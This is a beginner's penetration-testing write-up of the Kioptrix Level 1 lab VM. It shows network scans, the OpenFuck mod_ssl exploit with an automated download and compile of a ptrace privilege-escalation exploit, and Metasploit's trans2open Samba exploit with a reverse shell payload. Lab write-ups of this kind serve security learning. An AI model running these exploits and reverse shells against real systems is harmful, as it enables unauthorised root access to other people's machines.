## Kioptrix Level 1

So, I am newbie in the field of pentesting and this is going to my first write up. This is my first attempt on Kioptrix and it can be said rather on any pentesting challenge. So, let’s begin.

#### What is Kioptrix?
This Kioptrix VM Image are easy challenges. The object of the game is to acquire root access via any means possible (except actually hacking the VM server or player). The purpose of these games are to learn the basic tools and techniques in vulnerability assessment and exploitation. There are more ways then one to successfully complete the challenges.
Source: https://www.vulnhub.com/entry/kioptrix-level-1-1,22/

### Setup
So, I've set up the Kioptrix as well as Kali Linux on my Virtual Box. Also, both of them are configured for a bridged connection so that they can directly get their own IP Addresses.

### Reconnaissance
At the initial stage we don’t event know the IP address of Kioptrix. So, for that we can run a simple ```netdiscover``` command as given below:

```
root@kali:~# netdiscover -r 192.168.0.0/24

 Currently scanning: Finished!   |   Screen View: Unique Hosts                                                                                                                                               
                                                                                                                                                                                                             
 16 Captured ARP Req/Rep packets, from 5 hosts.   Total size: 960                                                                                                                                            
 _____________________________________________________________________________
   IP            At MAC Address     Count     Len  MAC Vendor / Hostname      
 -----------------------------------------------------------------------------
 192.168.0.1     0c:d2:xx:xx:xx:46      5     300  Router                                                                                                                      
 192.168.0.102   e8:d0:xx:xx:xx:87      3     180  Laptop                                                                                                                             
 192.168.0.100   44:07:xx:xx:xx:68      4     240  Speaker                                                                                                                                              
 192.168.0.101   04:c8:xx:xx:xx:98      2     120  Mobile                                                                                                                            
 192.168.0.108   08:00:xx:xx:xx:59      2     120  PCS Systemtechnik GmbH   
```

From the output above, I knew all the devices except for the one having IP address: 192.168.0.108. So, most probably our Kioptrix would be associated to this IP address only. We run another scan on the same IP, sp as to make sure this IP belongs to Kioptrix. And for that we use the ```nmap``` command:

```
root@kali:~# nmap -T4 -p- 192.168.0.108
Starting Nmap 7.80 ( https://nmap.org ) at 2019-11-11 12:54 IST
Nmap scan report for 192.168.0.108
Host is up (0.000074s latency).
Not shown: 65529 closed ports
PORT      STATE SERVICE
22/tcp    open  ssh
80/tcp    open  http
111/tcp   open  rpcbind
139/tcp   open  netbios-ssn
443/tcp   open  https
32768/tcp open  filenet-tms
MAC Address: 08:00:27:43:90:59 (Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 4.41 seconds

```

It can be seen that this is a briefing of all the open ports on the particular IP address. The meaning of different switches that we've used are:

-T4: Used for speed, 1 being the slowest and 5 being the fastest
-p-: Scan all the ports

From the output above, we can see several ports are open and it is interesting to see ports like 22, 80, 139 and 443 are open.  These can be vulnerable and we might get our access from one of these ports only. We can run another deep scan to get some more details for the same:

```
root@kali:~# nmap -A -T4 -p22,80,111,139,443,32768 192.168.0.108
Starting Nmap 7.80 ( https://nmap.org ) at 2019-11-11 12:56 IST
Nmap scan report for 192.168.0.108
Host is up (0.00080s latency).

PORT      STATE SERVICE     VERSION
22/tcp    open  ssh         OpenSSH 2.9p2 (protocol 1.99)
| ssh-hostkey: 
|   1024 b8:74:6c:db:fd:8b:e6:66:e9:2a:2b:df:5e:6f:64:86 (RSA1)
|   1024 8f:8e:5b:81:ed:21:ab:c1:80:e1:57:a3:3c:85:c4:71 (DSA)
|_  1024 ed:4e:a9:4a:06:14:ff:15:14:ce:da:3a:80:db:e2:81 (RSA)
|_sshv1: Server supports SSHv1
80/tcp    open  http        Apache httpd 1.3.20 ((Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b)
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b
|_http-title: Test Page for the Apache Web Server on Red Hat Linux
111/tcp   open  rpcbind     2 (RPC #100000)
139/tcp   open  netbios-ssn Samba smbd (workgroup: MYGROUP)
443/tcp   open  ssl/https   Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b
|_http-server-header: Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b
|_http-title: 400 Bad Request
|_ssl-date: 2019-11-11T17:57:35+00:00; +10h29m58s from scanner time.
| sslv2: 
|   SSLv2 supported
|   ciphers: 
|     SSL2_RC2_128_CBC_WITH_MD5
|     SSL2_DES_192_EDE3_CBC_WITH_MD5
|     SSL2_RC4_128_WITH_MD5
|     SSL2_DES_64_CBC_WITH_MD5
|     SSL2_RC4_128_EXPORT40_WITH_MD5
|     SSL2_RC4_64_WITH_MD5
|_    SSL2_RC2_128_CBC_EXPORT40_WITH_MD5
32768/tcp open  status      1 (RPC #100024)
MAC Address: 08:00:27:43:90:59 (Oracle VirtualBox virtual NIC)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 2.4.X
OS CPE: cpe:/o:linux:linux_kernel:2.4
OS details: Linux 2.4.9 - 2.4.18 (likely embedded)
Network Distance: 1 hop

Host script results:
|_clock-skew: 10h29m57s
|_nbstat: NetBIOS name: KIOPTRIX, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
|_smb2-time: Protocol negotiation failed (SMB2)

TRACEROUTE
HOP RTT     ADDRESS
1   0.80 ms 192.168.0.108

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 127.28 seconds
```

There is one more additional switch that is used here and that is the -A which is used to get details about OS, host and other thing.

From the output we can see the version of various services that are running on Kioptrix. Quickly comparing them we the current versions we figured out the following:

* Outdated mod_ssl 2.8.4: Current minimum is 2.8.1
* Outdated OpenSSL 0.9.6b: Current minimum is 1.1.1
* Outdated Apache 1.3.20: Current minimum is 2.8.37
* Samba is running on port 139, we will find the version it is running on using metasploit

We will also run Nikto to see if it can find some vulnerabilities. 

```
root@kali:~# nikto -h 192.168.0.108
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          192.168.0.108
+ Target Hostname:    192.168.0.108
+ Target Port:        80
+ Start Time:         2019-11-12 00:02:53 (GMT5.5)
---------------------------------------------------------------------------
+ Server: Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b
+ Server may leak inodes via ETags, header found with file /, inode: 34821, size: 2890, mtime: Thu Sep  6 08:42:46 2001
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ Apache/1.3.20 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.
+ OpenSSL/0.9.6b appears to be outdated (current is at least 1.1.1). OpenSSL 1.0.0o and 0.9.8zc are also current.
+ mod_ssl/2.8.4 appears to be outdated (current is at least 2.8.31) (may depend on server version)
+ OSVDB-27487: Apache is vulnerable to XSS via the Expect header
+ OSVDB-838: Apache/1.3.20 - Apache 1.x up 1.2.34 are vulnerable to a remote DoS and possible code execution. CAN-2002-0392.
+ OSVDB-4552: Apache/1.3.20 - Apache 1.3 below 1.3.27 are vulnerable to a local buffer overflow which allows attackers to kill any process on the system. CAN-2002-0839.
+ OSVDB-2733: Apache/1.3.20 - Apache 1.3 below 1.3.29 are vulnerable to overflows in mod_rewrite and mod_cgi. CAN-2003-0542.
+ mod_ssl/2.8.4 - mod_ssl 2.8.7 and lower are vulnerable to a remote buffer overflow which may allow a remote shell. http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2002-0082, OSVDB-756.
+ Allowed HTTP Methods: GET, HEAD, OPTIONS, TRACE 
+ OSVDB-877: HTTP TRACE method is active, suggesting the host is vulnerable to XST
+ ///etc/hosts: The server install allows reading of any system file by adding an extra '/' to the URL.
+ OSVDB-682: /usage/: Webalizer may be installed. Versions lower than 2.01-09 vulnerable to Cross Site Scripting (XSS).
+ OSVDB-3268: /manual/: Directory indexing found.
+ OSVDB-3092: /manual/: Web server manual found.
+ OSVDB-3268: /icons/: Directory indexing found.
+ OSVDB-3233: /icons/README: Apache default file found.
+ OSVDB-3092: /test.php: This might be interesting...
+ /wp-content/themes/twentyeleven/images/headers/server.php?filesrc=/etc/hosts: A PHP backdoor file manager was found.
+ /wordpresswp-content/themes/twentyeleven/images/headers/server.php?filesrc=/etc/hosts: A PHP backdoor file manager was found.
+ /wp-includes/Requests/Utility/content-post.php?filesrc=/etc/hosts: A PHP backdoor file manager was found.
+ /wordpresswp-includes/Requests/Utility/content-post.php?filesrc=/etc/hosts: A PHP backdoor file manager was found.
+ /wp-includes/js/tinymce/themes/modern/Meuhy.php?filesrc=/etc/hosts: A PHP backdoor file manager was found.
+ /wordpresswp-includes/js/tinymce/themes/modern/Meuhy.php?filesrc=/etc/hosts: A PHP backdoor file manager was found.
+ /assets/mobirise/css/meta.php?filesrc=: A PHP backdoor file manager was found.
+ /login.cgi?cli=aa%20aa%27cat%20/etc/hosts: Some D-Link router remote command execution.
+ /shell?cat+/etc/hosts: A backdoor was identified.
+ 8724 requests: 0 error(s) and 30 item(s) reported on remote host
+ End Time:           2019-11-12 00:03:20 (GMT5.5) (27 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```

In the Nikto scan as well we can see that the versions of Apache, openSSL and mod_ssl are outdated. So, we can surely try to exploit them and try to gain root access.

### Enumeration & Exploitation
We will try to look out for various exploits that are present in these oudated services. First of all we will try to look for vulnerablilites in Apache, OpenSSL and mod_ssl. We can find the exploit using google or maybe searchsploit. For now, I'll go with searchsploit.

We run the command: ```root@kali:~# searchsploit apache``` and a huge list of exploits is provided to us which are associated with Apache. But from these many exploits we are only interested in the ones that can exploit our outdated versions.

Out of the exploits that can suit our outdated version we came up acrossthe  Off by One Remote Buffer Overflow but for that we need to modify the .htacess file and store a variable of 12288 bytes in it. So that the apache server can't process it. But as we don't have access to the machine we won't be able to change the file. Hence, we move forward to another remote buffer overflow exploit called as OpenFuck.

Apparently the OpenFuck doesn't work as there are a lot of errors in that file. So, we move ahead to OpenFuckV2. And that even doesn’t work so we move on to second version of OpenFuckV2 which gets compiled.

* One thing to note for OpenFuck is that you need to first install the libssl-dev using the command:
```
root@kali:~# apt-get install libssl-dev
```
Once done you can compile the .c file and then run it. 

As OpenFuckV2(2) compile it gives a huge list of OS and various version on Apache. We select the one suitable for our case that is Apache 1.3.20. The instructions to run the exploit are also given in the same file. On running the exploit it looks something like:

```
root@kali:~/Desktop/kioptrix# ./OpenFuck 0x6b 192.168.0.108 -c 40

*******************************************************************
* OpenFuck v3.0.4-root priv8 by SPABAM based on openssl-too-open *
*******************************************************************
* by SPABAM    with code of Spabam - LSD-pl - SolarEclipse - CORE *
* #hackarena  irc.brasnet.org                                     *
* TNX Xanthic USG #SilverLords #BloodBR #isotk #highsecure #uname *
* #ION #delirium #nitr0x #coder #root #endiabrad0s #NHC #TechTeam *
* #pinchadoresweb HiTechHate DigitalWrapperz P()W GAT ButtP!rateZ *
*******************************************************************

Connection... 40 of 40
Establishing SSL connection
cipher: 0x4043808c   ciphers: 0x80f8070
Ready to send shellcode
Spawning shell...
bash: no job control in this shell
bash-2.05$ 
d.c; ./exploit; -kmod.c; gcc -o exploit ptrace-kmod.c -B /usr/bin; rm ptrace-kmo 
--14:58:08--  https://dl.packetstormsecurity.net/0304-exploits/ptrace-kmod.c
           => `ptrace-kmod.c'
Connecting to dl.packetstormsecurity.net:443... connected!
HTTP request sent, awaiting response... 200 OK
Length: 3,921 [text/x-csrc]

    0K ...                                                   100% @   1.25 MB/s

14:58:10 (957.28 KB/s) - `ptrace-kmod.c' saved [3921/3921]

/usr/bin/ld: cannot open output file exploit: Permission denied
collect2: ld returned 1 exit status
gcc: file path prefix `/usr/bin' never used
whoami 
root
hostname
kioptrix.level1
```

It can be seen that we got the root access but this is only through the vulnerabilities in Apache. We also need to check samba for any vulnerabilities. 

For knowing the version of Samba running on Kioptrix we will first run the auxilary scanner for Samba provided by metasploit. We search for smb in metasploit using command: ```search smb``` and we use the scanner ```auxiliary/scanner/smb/smb_version```. We need to change the rhosts value to the value of our target IP address before running the scanner. It can be done through ```msf5 auxiliary(scanner/smb/smb_version) > set rhosts 192.168.0.108```. The output after running the scanner is given below:

```
msf5 auxiliary(scanner/smb/smb_version) > run

[*] 192.168.0.108:139     - Host could not be identified: Unix (Samba 2.2.1a)
[*] 192.168.0.108:445     - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

So, now we know that Samba v2.2.1a is running on the Kioptrix. We can now easily look out for exploits associated with this version and can try to get access to the shell.

We can search for 'samba' in metasploit and find a few exploit for samba over there. From all the expoits available we are going to use the exploit trans2open to try to get access of Kioptrix root.

```
msf5 auxiliary(scanner/smb/smb_version) > use exploit/linux/samba/trans2open
```
On running the trans2open exploit, sessions get opened but the close immediately and it appears that there might be some issue with the payload.

```
msf5 exploit(linux/samba/trans2open) > run

[*] Started reverse TCP handler on 192.168.0.104:4444 
[*] 192.168.0.108:139 - Trying return address 0xbffffdfc...
[*] 192.168.0.108:139 - Trying return address 0xbffffcfc...
[*] 192.168.0.108:139 - Trying return address 0xbffffbfc...
[*] 192.168.0.108:139 - Trying return address 0xbffffafc...
[*] Sending stage (985320 bytes) to 192.168.0.108
[*] Meterpreter session 1 opened (192.168.0.104:4444 -> 192.168.0.108:32769) at 2019-11-12 01:27:08 +0530
[*] 192.168.0.108 - Meterpreter session 1 closed.  Reason: Died
[*] 192.168.0.108:139 - Trying return address 0xbffff9fc...
[*] Sending stage (985320 bytes) to 192.168.0.108
[*] Meterpreter session 2 opened (192.168.0.104:4444 -> 192.168.0.108:32770) at 2019-11-12 01:27:09 +0530
[*] 192.168.0.108 - Meterpreter session 2 closed.  Reason: Died
[*] 192.168.0.108:139 - Trying return address 0xbffff8fc...
[*] Sending stage (985320 bytes) to 192.168.0.108
[*] 192.168.0.108 - Meterpreter session 3 closed.  Reason: Died
[*] Meterpreter session 3 opened (127.0.0.1 -> 127.0.0.1) at 2019-11-12 01:27:10 +0530
[*] 192.168.0.108:139 - Trying return address 0xbffff7fc...
[*] Sending stage (985320 bytes) to 192.168.0.108
[*] Meterpreter session 4 opened (192.168.0.104:4444 -> 192.168.0.108:32772) at 2019-11-12 01:27:12 +0530
[*] 192.168.0.108 - Meterpreter session 4 closed.  Reason: Died
[*] 192.168.0.108:139 - Trying return address 0xbffff6fc...
[*] 192.168.0.108:139 - Trying return address 0xbffff5fc...
[*] 192.168.0.108:139 - Trying return address 0xbffff4fc...
^C[-] 192.168.0.108:139 - Exploit failed [user-interrupt]: Interrupt 
[-] run: Interrupted
```

Hence, we change the payload using the command: ```msf5 exploit(linux/samba/trans2open) > set payload generic/shell_reverse_tcp ``` and run the exploit again.

```
msf5 exploit(linux/samba/trans2open) > run

[*] Started reverse TCP handler on 192.168.0.104:4444 
[*] 192.168.0.108:139 - Trying return address 0xbffffdfc...
[*] 192.168.0.108:139 - Trying return address 0xbffffcfc...
[*] 192.168.0.108:139 - Trying return address 0xbffffbfc...
[*] 192.168.0.108:139 - Trying return address 0xbffffafc...
[*] Command shell session 5 opened (192.168.0.104:4444 -> 192.168.0.108:32773) at 2019-11-12 01:31:53 +0530

whoami
root
hostname
kioptrix.level1
```

So, we got the root access once again by exploiting Samba.

Thank you reading the write-up. Please do let me know if there are any suggestions for improving the quality of my write up.

Testing

